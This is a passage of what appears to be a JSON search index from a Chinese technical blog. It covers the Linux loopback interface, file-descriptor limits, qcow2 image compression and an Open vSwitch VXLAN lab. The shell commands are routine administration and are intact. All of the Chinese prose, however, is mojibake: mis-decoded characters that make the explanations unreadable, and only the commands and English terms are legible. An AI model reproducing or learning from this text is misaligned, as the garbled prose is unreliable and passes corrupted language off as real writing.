è™šæ‹Ÿç½‘å¡çš„IPå±äºæœ¬æœºIPå—ï¼Ÿ å±äºï¼Œå› ä¸ºä¸å®¿ä¸»æœºå™¨å…±ç”¨åŒä¸€ä¸ªç½‘ç»œåè®®æ ˆã€‚\nå®¿ä¸»æœºå™¨ä¸Šåˆ›å»ºnetnsï¼Œnetnså†…éƒ¨çš„IPå±äºæœ¬æœºIPå—ï¼Ÿ ä¸å±äºï¼Œå› ä¸ºnetnsæ‹¥æœ‰ç‹¬ç«‹çš„ç½‘ç»œåè®®æ ˆï¼Œåœ¨netnså†…éƒ¨ä¹Ÿå¯ä»¥çœ‹åˆ°å®ƒæœ¬èº«çš„ç¯å›ç½‘ç»œæ¥å£ã€‚\n","permalink":"https://www.typesafe.cn/posts/linux-loopback/","summary":"\u003cp\u003eåœ¨å¼€å‘æˆ–è€…è°ƒè¯•æ—¶ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦å’Œæœ¬åœ°çš„æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œä¾‹å¦‚å¯åŠ¨\u003ccode\u003enginx\u003c/code\u003eä¹‹åï¼Œåœ¨æµè§ˆå™¨è¾“å…¥\u003ccode\u003elcoalhost\u003c/code\u003eæˆ–è€…\u003ccode\u003e127.0.0.1\u003c/code\u003eå°±å¯ä»¥è®¿é—®åˆ°æœ¬æœºä¸Šé¢çš„\u003ccode\u003ehttp\u003c/code\u003eæœåŠ¡ã€‚\u003c/p\u003e\n\u003ch2 id=\"linuxæ˜¯å¦‚ä½•è®¿é—®æœ¬æœºipçš„\"\u003eLinuxæ˜¯å¦‚ä½•è®¿é—®æœ¬æœºIPçš„ï¼Ÿ\u003c/h2\u003e\n\u003cp\u003eå¤§å¤šæ•°æ“ä½œç³»ç»Ÿéƒ½åœ¨ç½‘ç»œå±‚å®ç°äº†ç¯å›èƒ½åŠ›ï¼Œé€šå¸¸æ˜¯ä½¿ç”¨ä¸€ä¸ªè™šæ‹Ÿçš„ç¯å›ç½‘ç»œæ¥å£æ¥å®ç°ã€‚è¿™ä¸ªè™šæ‹Ÿçš„ç¯å›ç½‘ç»œæ¥å£çœ‹ç€åƒæ˜¯ä¸€ä¸ªçœŸå®çš„ç½‘å¡ï¼Œå®é™…ä¸Šæ˜¯æ“ä½œç³»ç»Ÿç”¨è½¯ä»¶æ¨¡æ‹Ÿçš„ï¼Œå®ƒå¯ä»¥é€šè¿‡\u003ccode\u003eTCP/IP\u003c/code\u003eä¸åŒä¸€å°ä¸»æœºä¸Šçš„å…¶ä»–æœåŠ¡è¿›è¡Œé€šä¿¡ï¼Œä»¥\u003ccode\u003e127\u003c/code\u003eå¼€å¤´çš„\u003ccode\u003eIPv4\u003c/code\u003eåœ°å€å°±æ˜¯ä¸ºå®ƒä¿ç•™çš„ï¼Œä¸»æµ\u003ccode\u003eLinux\u003c/code\u003eæ“ä½œç³»ç»Ÿä¸ºç¯å›ç½‘å¡åˆ†é…çš„åœ°å€éƒ½æ˜¯\u003ccode\u003e127.0.0.1\u003c/code\u003eï¼Œä¸»æœºåæ˜¯\u003ccode\u003elocalhost\u003c/code\u003eã€‚\u003c/p\u003e\n\u003cp\u003eç¯å›ç½‘ç»œæ¥å£ä¹‹æ‰€ä»¥è¢«ç§°ä¹‹ä¸ºç¯å›ç½‘ç»œæ¥å£ï¼Œæ˜¯å› ä¸ºä»æœ¬æœºå‘é€åˆ°æœ¬æœºä»»æ„ä¸€ä¸ªIPçš„æ•°æ®æŠ¥æ–‡éƒ½ä¼šåœ¨ç½‘ç»œå±‚äº¤ç»™ç¯å›ç½‘ç»œæ¥å£ï¼Œä¸å†ä¸‹å‘åˆ°æ•°æ®é“¾è·¯å±‚è¿›è¡Œå¤„ç†ï¼Œç¯å›ç½‘ç»œæ¥å£ç›´æ¥å‘é€å›ç½‘ç»œå±‚ï¼Œæœ€ç»ˆäº¤ç”±åº”ç”¨å±‚è½¯ä»¶ç¨‹åºè¿›è¡Œå¤„ç†ã€‚è¿™ç§æ–¹å¼å¯¹äºæ€§èƒ½æµ‹è¯•éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºçœå»äº†ç¡¬ä»¶çš„å¼€é”€ï¼Œå¯ä»¥ç›´æ¥æµ‹è¯•åè®®æ ˆè½¯ä»¶æ‰€éœ€è¦çš„æ—¶é—´ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ç¯å›ç½‘ç»œæ¥å£æ˜¯å¦‚ä½•åˆ¤æ–­ç›®çš„IPæ˜¯å¦ä¸ºæœ¬æœºåœ°å€çš„å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eç­”æ¡ˆå°±æ˜¯ç½‘ç»œå±‚åœ¨è¿›è¡Œè·¯ç”±è½¬å‘çš„æ—¶å€™ä¼šå…ˆæŸ¥æœ¬åœ°çš„è·¯ç”±è¡¨ï¼Œå‘ç°æ˜¯æœ¬æœºIPåäº¤ç»™ç¯å›ç½‘ç»œæ¥å£ã€‚æŸ¥çœ‹æœ¬åœ°è·¯ç”±è¡¨çš„å‘½ä»¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip route show table local\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¾“å‡ºå†…å®¹å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebroadcast 10.141.128.0 dev eth0 proto kernel scope link src 10.141.155.131 \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elocal 10.141.155.131 dev eth0 proto kernel scope host src 10.141.155.131 \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebroadcast 10.141.191.255 dev eth0 proto kernel scope link src 10.141.155.131 \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebroadcast 127.0.0.0 dev lo proto kernel scope link src 127.0.0.1 \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elocal 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1 \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elocal 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå…¶ä¸­\u003ccode\u003elocal\u003c/code\u003eå¼€å¤´çš„ä¾¿æ˜¯æœ¬åœ°IPï¼Œ\u003ccode\u003edev\u003c/code\u003eåé¢æ˜¯ç½‘å¡åç§°ã€‚\u003c/p\u003e","title":"Linux ç¯å›ç½‘ç»œæ¥å£"},{"content":"echo \u0026#34;fs.file-max=655350\u0026#34; \u0026gt;\u0026gt;/etc/sysctl.conf echo \u0026#34;* soft nofile 655350\u0026#34; \u0026gt;\u0026gt; /etc/security/limits.conf echo \u0026#34;* hard nofile 655350\u0026#34; \u0026gt;\u0026gt; /etc/security/limits.conf ulimit -n 655350 ","permalink":"https://www.typesafe.cn/posts/linux-limit/","summary":"\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eecho \u0026#34;fs.file-max=655350\u0026#34; \u0026gt;\u0026gt;/etc/sysctl.conf\necho \u0026#34;* soft nofile 655350\u0026#34;  \u0026gt;\u0026gt; /etc/security/limits.conf\necho \u0026#34;* hard nofile 655350\u0026#34;  \u0026gt;\u0026gt; /etc/security/limits.conf\nulimit -n 655350\n\u003c/code\u003e\u003c/pre\u003e","title":"Linux ä¿®æ”¹æœ€å¤§æ–‡ä»¶æè¿°ç¬¦"},{"content":"å‹ç¼©qcow2 é¦–å…ˆï¼Œéœ€è¦å¯¹è™šæ‹Ÿæœºå‰©ä½™ç©ºé—´è¿›è¡Œå†™é›¶æ“ä½œï¼š\ndd if=/dev/zero of=/zero.dat åˆ é™¤ zero.datï¼š\nrm /zero.dat å…³é—­è™šæ‹Ÿæœºï¼Œæ‰§è¡Œqemu-imgçš„convertå‘½ä»¤è¿›è¡Œè½¬æ¢ï¼š\nqemu-img convert -c -O qcow2 /path/old.img.qcow2 /path/new.img.qcow2 ","permalink":"https://www.typesafe.cn/posts/qcow2-image-compression/","summary":"\u003ch1 id=\"å‹ç¼©qcow2\"\u003eå‹ç¼©qcow2\u003c/h1\u003e\n\u003cp\u003eé¦–å…ˆï¼Œéœ€è¦å¯¹è™šæ‹Ÿæœºå‰©ä½™ç©ºé—´è¿›è¡Œå†™é›¶æ“ä½œï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003edd if=/dev/zero of=/zero.dat\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eåˆ é™¤ zero.datï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003erm /zero.dat\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eå…³é—­è™šæ‹Ÿæœºï¼Œæ‰§è¡Œ\u003ccode\u003eqemu-img\u003c/code\u003eçš„\u003ccode\u003econvert\u003c/code\u003eå‘½ä»¤è¿›è¡Œè½¬æ¢ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eqemu-img convert -c -O qcow2 /path/old.img.qcow2 /path/new.img.qcow2\n\u003c/code\u003e\u003c/pre\u003e","title":"å‹ç¼©qcow2 é•œåƒæ–‡ä»¶"},{"content":"ä»€ä¹ˆæ˜¯VXLANï¼Ÿ VXLANæ˜¯ä¸€ç§éš§é“å°è£…åè®®ï¼Œåœ¨ä¸‰å±‚ç½‘ç»œä¸Šå°è£…äºŒå±‚ç½‘ç»œæ•°æ®æŠ¥æ–‡ã€‚ç®€å•æ¥è¯´å°±æ˜¯å¯ä»¥åœ¨å·²ç»è§„åˆ’å¥½ç½‘ç»œæ‹“æ‰‘çš„è®¾å¤‡ä¸Šå°è£…å‡ºä¸€ä¸ªæ–°çš„äºŒå±‚ç½‘ç»œï¼Œå› æ­¤VXLANè¿™ç±»ç½‘ç»œåˆè¢«ç§°ä¹‹ä¸ºoverylayç½‘ç»œï¼Œåº•ä¸‹æ‰¿è½½VXLANç½‘ç»œçš„å°±è¢«ç§°ä¹‹ä¸ºunderlayç½‘ç»œã€‚\nVXLANè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ æœ€è¿‘å‡ å¹´ï¼Œé˜¿é‡Œäº‘ï¼Œè…¾è®¯äº‘ï¼Œäº¬ä¸œäº‘ï¼Œåä¸ºäº‘ç­‰ç­‰å‚å•†æ¯åˆ°èŠ‚æ—¥éƒ½ä¼šæ‰“æŠ˜å‡ºå”®å¤§é‡äº‘æœåŠ¡å™¨ï¼Œ1æ ¸1Gå†…å­˜50Gç£ç›˜çš„æœåŠ¡å™¨å‡ åå—å°±èƒ½ä¹°åˆ°ä¸€å¹´çš„ä½¿ç”¨æƒï¼Œä½œä¸ºä¸€ä¸ªä¸“ä¸šçš„ç¾Šæ¯›å…šï¼Œå“ªä¸ªæ‰‹é‡Œæ²¡æœ‰å‡ å°å°ç ´æ°´ç®¡æœºå™¨ï¼Ÿä½†æ˜¯è¿™ä¹ˆå¤šçš„äº‘æœåŠ¡å™¨æ˜¯å‚å•†å¦‚ä½•åšéš”ç¦»çš„å‘¢ï¼Ÿäº†è§£è¿‡ç½‘ç»œçš„åŒå­¦æˆ–è®¸ä¼šè¯´VLANã€‚ä½†æ˜¯VLANè¿™ç§åªèƒ½éš”ç¦»4094ä¸ªè™šæ‹Ÿç½‘ç»œçš„æŠ€æœ¯åˆ«è¯´æ»¡è¶³ä¸äº†ç¾Šæ¯›å…šäº†ï¼Œå°±è¿æ­£å¸¸çš„ç”¨æˆ·ä¼°è®¡éƒ½æ’‘ä¸ä½ã€‚é‚£ä¸éš”ç¦»èƒ½è¡Œå—ï¼Œå‚å•†è§„åˆ’ä¸€ä¸ªç‰¹åˆ«å¤§çš„ç½‘æ®µï¼Œè®©å¤§å®¶éƒ½åœ¨è¿™é‡Œé¢è€ï¼Œæ­£å¸¸ç”¨æˆ·è¿˜å¥½ï¼Œä¸‡ä¸€è¿™ä¸ªæ—¶å€™è¿›æ¥ä¸€ä¸ªå¤§é»‘å®¢ï¼Œä¼°è®¡å°±ä¼šå…¨éƒ¨GGã€‚\nå› æ­¤ï¼Œéš”ç¦»æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œå…¶ä¸­å…³é”®çš„æŠ€æœ¯å°±æ˜¯overlayç½‘ç»œã€‚\né‚£VXLANå…·ä½“è§£å†³äº†å“ªäº›é—®é¢˜å‘¢ï¼Ÿ\nçªç ´äº†VLANæŠ€æœ¯4094ä¸ªéš”ç¦»ç½‘ç»œçš„é™åˆ¶ï¼Œåœ¨ä¸€ä¸ªç®¡ç†åŸŸä¸­åˆ›å»ºå¤šè¾¾1600ä¸‡ä¸ªVXLANç½‘ç»œã€‚ VXLANæä¾›äº†äº‘æœåŠ¡å‚å•†æ‰€éœ€çš„è§„æ¨¡çš„ç½‘ç»œåˆ†æ®µï¼Œä»¥æ”¯æŒå¤§é‡ç§Ÿæˆ·ã€‚ çªç ´äº†ç‰©ç†ç½‘ç»œè¾¹ç•Œçš„é™åˆ¶ï¼Œä¼ ç»Ÿè™šæ‹ŸäºŒå±‚ç½‘ç»œï¼ˆVLANï¼‰æ˜¯éœ€è¦å’Œç‰©ç†ç½‘ç»œåšå¤§é‡é€‚é…å·¥ä½œæ‰èƒ½ä¿è¯ç¯å¢ƒçš„è¿ç§»ä¸ä¼šå¯¼è‡´è™šæ‹Ÿç½‘ç»œå¼‚å¸¸ï¼Œoverlayç½‘ç»œåˆ™ä¸å¿…å…³å¿ƒåº•å±‚ç‰©ç†ç½‘ç»œæ˜¯å¦‚ä½•æ­å»ºçš„ï¼Œåªè¦èƒ½ä¿è¯VXLANç«¯ç‚¹ç›¸äº’ä¹‹é—´å¯ä»¥è”é€šå³å¯ã€‚ VXLANç½‘ç»œå¦‚ä½•å·¥ä½œï¼Ÿ VXLANéš§é“åè®®å°†äºŒå±‚ä»¥å¤ªç½‘å¸§å°è£…åœ¨ä¸‰å±‚UDPæ•°æ®åŒ…ä¸­ï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿåˆ›å»ºè·¨ç‰©ç†ä¸‰å±‚ç½‘ç»œçš„è™šæ‹ŸåŒ–äºŒå±‚å­ç½‘æˆ–ç½‘æ®µã€‚æ¯ä¸ªäºŒå±‚å­ç½‘ä½¿ç”¨VXLANç½‘ç»œæ ‡è¯†ç¬¦ï¼ˆVNIï¼‰ä½œä¸ºå”¯ä¸€æ ‡è¯†ã€‚æŠ¥æ–‡æ ¼å¼å¦‚ä¸‹å›¾ï¼š\næ‰§è¡Œæ•°æ®åŒ…å°è£…å’Œè§£å°è£…çš„å®ä½“ç§°ä¸ºVXLANéš§é“ç»ˆç»“ç‚¹ï¼ˆVTEPï¼‰ã€‚VTEPä¸»è¦åˆ†ä¸ºä¸¤ç±»ï¼šç¡¬ä»¶VTEPå’Œè½¯ä»¶VTEPã€‚ç¡¬ä»¶VTEPæˆ‘æ¥è§¦è¾ƒå°‘ï¼Œè¿™é‡Œå°±ä¸å†ä»‹ç»äº†ã€‚\nè½¯ä»¶VTEPå¦‚ä¸‹å›¾æ‰€ç¤ºï¼šVTEPåœ¨æ•°æ®åŒ…åˆ°è¾¾è™šæ‹Ÿæœºä¹‹å‰è¿›è¡Œäº†å°è£…å’Œè§£å°è£…ï¼Œä½¿å¾—è™šæ‹Ÿæœºå®Œå…¨ä¸éœ€è¦çŸ¥é“VXLANéš§é“ä»¥åŠå®ƒä»¬ä¹‹é—´çš„ä¸‰å±‚ç½‘ç»œã€‚\nç®€å•VXLANå®éªŒ æˆ‘ä»¬å‚ç…§ä¸‹å›¾å®Œæˆå®éªŒã€‚\nä¸»æœºA # åˆ›å»ºéš§é“ç½‘æ¡¥ ovs-vsctl add-br br-tun # åˆ›å»ºéš§é“ç«¯å£å¹¶æŒ‡å®šè¿œç«¯IPå’ŒVXLAN ID ovs-vsctl add-port br-tun vx01 -- set Interface vx01 type=vxlan options:remote_ip=192.168.123.232 options:key=1111 # åˆ›å»ºå†…éƒ¨ç«¯å£ ovs-vsctl add-port br-tun vnet0 -- set Interface vnet0 type=internal # åˆ›å»ºnetnsç”¨äºæ¨¡æ‹Ÿè™šæ‹Ÿç½‘ç»œè®¾å¤‡ ip netns add ns0 # å°†å†…éƒ¨ç«¯å£ç§»åŠ¨åˆ°netnsä¸­ ip link set vnet0 netns ns0 # å¯åŠ¨ç½‘å¡ ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up # é…ç½®IP ip netns exec ns0 ip addr add 192.168.0.1/24 dev vnet0 ä¸»æœºB # åˆ›å»ºéš§é“ç½‘æ¡¥ ovs-vsctl add-br br-tun # åˆ›å»ºéš§é“ç«¯å£å¹¶æŒ‡å®šè¿œç«¯IPå’ŒVXLAN ID ovs-vsctl add-port br-tun vx01 -- set Interface vx01 type=vxlan options:remote_ip=192.168.123.231 options:key=1111 # åˆ›å»ºå†…éƒ¨ç«¯å£ ovs-vsctl add-port br-tun vnet0 -- set Interface vnet0 type=internal # åˆ›å»ºnetnsç”¨äºæ¨¡æ‹Ÿè™šæ‹Ÿç½‘ç»œè®¾å¤‡ ip netns add ns0 # å°†å†…éƒ¨ç«¯å£ç§»åŠ¨åˆ°netnsä¸­ ip link set vnet0 netns ns0 # å¯åŠ¨ç½‘å¡ ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up # é…ç½®IP ip netns exec ns0 ip addr add 192.168.0.2/24 dev vnet0 æµ‹è¯• åœ¨ä¸»æœºAä¸Šæµ‹è¯•ç½‘ç»œè¿é€šæ€§ ip netns exec ns0 ping 192.168.0.2\nPING 192.168.0.2 (192.168.0.2) 56(84) bytes of data. 64 bytes from 192.168.0.2: icmp_seq=1 ttl=64 time=0.715 ms 64 bytes from 192.168.0.2: icmp_seq=2 ttl=64 time=0.372 ms 64 bytes from 192.168.0.2: icmp_seq=3 ttl=64 time=0.205 ms 64 bytes from 192.168.0.2: icmp_seq=4 ttl=64 time=0.230 ms ^C --- 192.168.0.2 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 111ms rtt min/avg/max/mdev = 0.205/0.380/0.715/0.204 ms å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åªä½¿ç”¨ä¸€å¼ ç½‘å¡å°±æˆåŠŸçš„åœ¨å·²æœ‰çš„ç‰©ç†ç½‘ç»œä¸Šå»ºç«‹äº†ä¸€ä¸ªæ–°çš„åˆ†å¸ƒå¼äºŒå±‚ç½‘ç»œã€‚\nåœ¨è¿™ä¸ªå®éªŒä¸­æˆ‘ä½¿ç”¨äº†å›ºå®šçš„VXLAN ID 1111ï¼Œåªæ˜¯ä¸ºäº†ç®€åŒ–å®éªŒï¼Œæ— å…¶ä»–å«ä¹‰ã€‚\nå½“æˆ‘ä»¬æ­¤æ—¶åœ¨ä¸»æœºBä¸Šå¯¹ç‰©ç†ç½‘å¡eth0ä½¿ç”¨tcpdumpæŠ“åŒ…æ—¶ã€‚\ntcpdump -l -n -vv -i eth0 \u0026#39;port 4789 and udp[8:2] = 0x0800 \u0026amp; 0x0800 and udp[11:4] = 1111 \u0026amp; 0x00FFFFFF\u0026#39; å¯ä»¥çœ‹åˆ°ç±»ä¼¼æˆ‘ä¸‹é¢æˆªå–çš„æ•°æ®åŒ…ã€‚\n09:09:59.080604 IP (tos 0x0, ttl 64, id 12981, offset 0, flags [DF], proto UDP (17), length 134) 192.168.123.231.59648 \u0026gt; 192.168.123.232.vxlan: [no cksum] VXLAN, flags [I] (0x08), vni 1111 IP (tos 0x0, ttl 64, id 29815, offset 0, flags [DF], proto ICMP (1), length 84) 192.168.0.1 \u0026gt; 192.168.0.2: ICMP echo request, id 1928, seq 1, length 64 è¿™æ˜¯ä¸€æ¡å®Œæ•´çš„æ•°æ®æŠ¥æ–‡ï¼Œåªæ˜¯æ ¼å¼åŒ–æˆäº†4è¡Œã€‚\nå‰ä¸¤è¡Œæ˜¯underlayç½‘ç»œçš„æŠ¥æ–‡ï¼Œä¹Ÿå°±æ˜¯åº•å±‚æ‰¿è½½ç½‘ç»œã€‚åˆ†åˆ«æ˜¯ï¼š\nåº•å±‚åè®® proto UDP (17) åŒ…é•¿åº¦ length 134 æºå’Œç›®çš„åœ°å€ 192.168.123.231.59648 \u0026gt; 192.168.123.232.vxlan VXLAN IDï¼švni 1111 åä¸¤è¡Œæ˜¯overlayç½‘ç»œçš„æŠ¥æ–‡ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„è™šæ‹Ÿç½‘ç»œã€‚åˆ†åˆ«æ˜¯ï¼š\næ‰¿è½½çš„åè®®æ˜¯ proto ICMP (1) åŒ…é•¿åº¦ length 84 æºå’Œç›®çš„åœ°å€ 192.168.0.1 \u0026gt; 192.168.0.2 å¯ä»¥çœ‹å‡ºè¿™äº›ä¿¡æ¯å’Œæˆ‘ä»¬çš„å®éªŒç¯å¢ƒéå¸¸åŒ¹é…ï¼Œåªæœ‰åŒ…å¤§å°ä¸å¤ªä¸€è‡´ï¼Œè¿™æ˜¯å› ä¸ºunderlayç½‘ç»œçš„åŸºç¡€ä¿¡æ¯åˆšå¥½å æœ‰äº†50ä¸ªå­—èŠ‚ï¼Œä¸ä¿¡ä½ å¯ä»¥åŠ ä¸€ä¸‹ä¸Šé¢çš„æŠ¥æ–‡æ ¼å¼ä¸­çš„æ•°å­—ã€‚\næœ€åä¹Ÿä¸è¦å¿˜è®°æ¸…ç†å®éªŒç¯å¢ƒã€‚\n# åœ¨ä¸»æœºAå’ŒBä¸Šéƒ½éœ€è¦æ‰§è¡Œ ovs-vsctl del-br br-tun ip netns del ns0 ","permalink":"https://www.typesafe.cn/posts/ovs-learn-6/","summary":"\u003ch1 id=\"ä»€ä¹ˆæ˜¯vxlan\"\u003eä»€ä¹ˆæ˜¯VXLANï¼Ÿ\u003c/h1\u003e\n\u003cp\u003eVXLANæ˜¯ä¸€ç§éš§é“å°è£…åè®®ï¼Œåœ¨ä¸‰å±‚ç½‘ç»œä¸Šå°è£…äºŒå±‚ç½‘ç»œæ•°æ®æŠ¥æ–‡ã€‚ç®€å•æ¥è¯´å°±æ˜¯å¯ä»¥åœ¨å·²ç»è§„åˆ’å¥½ç½‘ç»œæ‹“æ‰‘çš„è®¾å¤‡ä¸Šå°è£…å‡ºä¸€ä¸ªæ–°çš„äºŒå±‚ç½‘ç»œï¼Œå› æ­¤VXLANè¿™ç±»ç½‘ç»œåˆè¢«ç§°ä¹‹ä¸ºoverylayç½‘ç»œï¼Œåº•ä¸‹æ‰¿è½½VXLANç½‘ç»œçš„å°±è¢«ç§°ä¹‹ä¸ºunderlayç½‘ç»œã€‚\u003c/p\u003e\n\u003ch1 id=\"vxlanè§£å†³äº†ä»€ä¹ˆé—®é¢˜\"\u003eVXLANè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ\u003c/h1\u003e\n\u003cp\u003eæœ€è¿‘å‡ å¹´ï¼Œé˜¿é‡Œäº‘ï¼Œè…¾è®¯äº‘ï¼Œäº¬ä¸œäº‘ï¼Œåä¸ºäº‘ç­‰ç­‰å‚å•†æ¯åˆ°èŠ‚æ—¥éƒ½ä¼šæ‰“æŠ˜å‡ºå”®å¤§é‡äº‘æœåŠ¡å™¨ï¼Œ1æ ¸1Gå†…å­˜50Gç£ç›˜çš„æœåŠ¡å™¨å‡ åå—å°±èƒ½ä¹°åˆ°ä¸€å¹´çš„ä½¿ç”¨æƒï¼Œä½œä¸ºä¸€ä¸ªä¸“ä¸šçš„ç¾Šæ¯›å…šï¼Œå“ªä¸ªæ‰‹é‡Œæ²¡æœ‰å‡ å°å°ç ´æ°´ç®¡æœºå™¨ï¼Ÿä½†æ˜¯è¿™ä¹ˆå¤šçš„äº‘æœåŠ¡å™¨æ˜¯å‚å•†å¦‚ä½•åšéš”ç¦»çš„å‘¢ï¼Ÿäº†è§£è¿‡ç½‘ç»œçš„åŒå­¦æˆ–è®¸ä¼šè¯´VLANã€‚ä½†æ˜¯VLANè¿™ç§åªèƒ½éš”ç¦»4094ä¸ªè™šæ‹Ÿç½‘ç»œçš„æŠ€æœ¯åˆ«è¯´æ»¡è¶³ä¸äº†ç¾Šæ¯›å…šäº†ï¼Œå°±è¿æ­£å¸¸çš„ç”¨æˆ·ä¼°è®¡éƒ½æ’‘ä¸ä½ã€‚é‚£ä¸éš”ç¦»èƒ½è¡Œå—ï¼Œå‚å•†è§„åˆ’ä¸€ä¸ªç‰¹åˆ«å¤§çš„ç½‘æ®µï¼Œè®©å¤§å®¶éƒ½åœ¨è¿™é‡Œé¢è€ï¼Œæ­£å¸¸ç”¨æˆ·è¿˜å¥½ï¼Œä¸‡ä¸€è¿™ä¸ªæ—¶å€™è¿›æ¥ä¸€ä¸ªå¤§é»‘å®¢ï¼Œä¼°è®¡å°±ä¼šå…¨éƒ¨GGã€‚\u003c/p\u003e\n\u003cp\u003eå› æ­¤ï¼Œéš”ç¦»æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œå…¶ä¸­å…³é”®çš„æŠ€æœ¯å°±æ˜¯overlayç½‘ç»œã€‚\u003c/p\u003e\n\u003cp\u003eé‚£VXLANå…·ä½“è§£å†³äº†å“ªäº›é—®é¢˜å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eçªç ´äº†VLANæŠ€æœ¯4094ä¸ªéš”ç¦»ç½‘ç»œçš„é™åˆ¶ï¼Œåœ¨ä¸€ä¸ªç®¡ç†åŸŸä¸­åˆ›å»ºå¤šè¾¾1600ä¸‡ä¸ªVXLANç½‘ç»œã€‚\u003c/li\u003e\n\u003cli\u003eVXLANæä¾›äº†äº‘æœåŠ¡å‚å•†æ‰€éœ€çš„è§„æ¨¡çš„ç½‘ç»œåˆ†æ®µï¼Œä»¥æ”¯æŒå¤§é‡ç§Ÿæˆ·ã€‚\u003c/li\u003e\n\u003cli\u003eçªç ´äº†ç‰©ç†ç½‘ç»œè¾¹ç•Œçš„é™åˆ¶ï¼Œä¼ ç»Ÿè™šæ‹ŸäºŒå±‚ç½‘ç»œï¼ˆVLANï¼‰æ˜¯éœ€è¦å’Œç‰©ç†ç½‘ç»œåšå¤§é‡é€‚é…å·¥ä½œæ‰èƒ½ä¿è¯ç¯å¢ƒçš„è¿ç§»ä¸ä¼šå¯¼è‡´è™šæ‹Ÿç½‘ç»œå¼‚å¸¸ï¼Œoverlayç½‘ç»œåˆ™ä¸å¿…å…³å¿ƒåº•å±‚ç‰©ç†ç½‘ç»œæ˜¯å¦‚ä½•æ­å»ºçš„ï¼Œåªè¦èƒ½ä¿è¯VXLANç«¯ç‚¹ç›¸äº’ä¹‹é—´å¯ä»¥è”é€šå³å¯ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1 id=\"vxlanç½‘ç»œå¦‚ä½•å·¥ä½œ\"\u003eVXLANç½‘ç»œå¦‚ä½•å·¥ä½œï¼Ÿ\u003c/h1\u003e\n\u003cp\u003eVXLANéš§é“åè®®å°†äºŒå±‚ä»¥å¤ªç½‘å¸§å°è£…åœ¨ä¸‰å±‚UDPæ•°æ®åŒ…ä¸­ï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿåˆ›å»ºè·¨ç‰©ç†ä¸‰å±‚ç½‘ç»œçš„è™šæ‹ŸåŒ–äºŒå±‚å­ç½‘æˆ–ç½‘æ®µã€‚æ¯ä¸ªäºŒå±‚å­ç½‘ä½¿ç”¨VXLANç½‘ç»œæ ‡è¯†ç¬¦ï¼ˆVNIï¼‰ä½œä¸ºå”¯ä¸€æ ‡è¯†ã€‚æŠ¥æ–‡æ ¼å¼å¦‚ä¸‹å›¾ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"VXLANæŠ¥æ–‡æ ¼å¼\" loading=\"lazy\" src=\"https://oss.typesafe.cn/vxlan_packet_header.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæ‰§è¡Œæ•°æ®åŒ…å°è£…å’Œè§£å°è£…çš„å®ä½“ç§°ä¸ºVXLANéš§é“ç»ˆç»“ç‚¹ï¼ˆVTEPï¼‰ã€‚VTEPä¸»è¦åˆ†ä¸ºä¸¤ç±»ï¼šç¡¬ä»¶VTEPå’Œè½¯ä»¶VTEPã€‚ç¡¬ä»¶VTEPæˆ‘æ¥è§¦è¾ƒå°‘ï¼Œè¿™é‡Œå°±ä¸å†ä»‹ç»äº†ã€‚\u003c/p\u003e\n\u003cp\u003eè½¯ä»¶VTEPå¦‚ä¸‹å›¾æ‰€ç¤ºï¼šVTEPåœ¨æ•°æ®åŒ…åˆ°è¾¾è™šæ‹Ÿæœºä¹‹å‰è¿›è¡Œäº†å°è£…å’Œè§£å°è£…ï¼Œä½¿å¾—è™šæ‹Ÿæœºå®Œå…¨ä¸éœ€è¦çŸ¥é“VXLANéš§é“ä»¥åŠå®ƒä»¬ä¹‹é—´çš„ä¸‰å±‚ç½‘ç»